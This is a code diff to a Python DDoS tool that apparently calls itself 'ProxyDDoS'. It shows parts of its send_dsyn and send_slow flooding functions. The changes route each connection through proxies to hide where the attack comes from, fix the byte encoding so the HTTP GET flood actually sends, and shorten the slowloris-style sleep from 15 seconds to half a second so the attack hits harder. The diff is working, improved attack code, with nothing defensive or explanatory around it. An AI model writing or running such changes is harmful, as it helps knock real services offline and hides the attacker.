@@ -350,7 +350,7 @@ def send_dsyn():
         try:
             s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
             s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
-            s.connect((host, port))
+            s.connect((proxy_ip, proxy_port))
             if port == 443:
                 context = ssl.SSLContext(ssl.PROTOCOL_TLS_CLIENT)
                 context.check_hostname = False
@@ -358,7 +358,7 @@ def send_dsyn():
                 s = context.wrap_socket(s, server_hostname=host)
             try:
                 for _ in range(100):
-                    s.send(f"GET / HTTP/1.1\r\nHost: {host}\r\nConnection: Keep-Alive\r\n\r\n")
+                    s.send(f"GET / HTTP/1.1\r\nHost: {host}\r\nConnection: Keep-Alive\r\n\r\n".encode())
                 print(f"[ProxyDDoS] DSYN FLOODING {host} < {proxy_ip}")
             except:
                 s.close()
@@ -411,7 +411,7 @@ def send_slow():
                     s.close()
                     socket_list.remove(s)
                     threading.Thread(target=launch_slow, daemon=True).start()
-            time.sleep(15)
+            time.sleep(0.5)
         else:
             pass
 
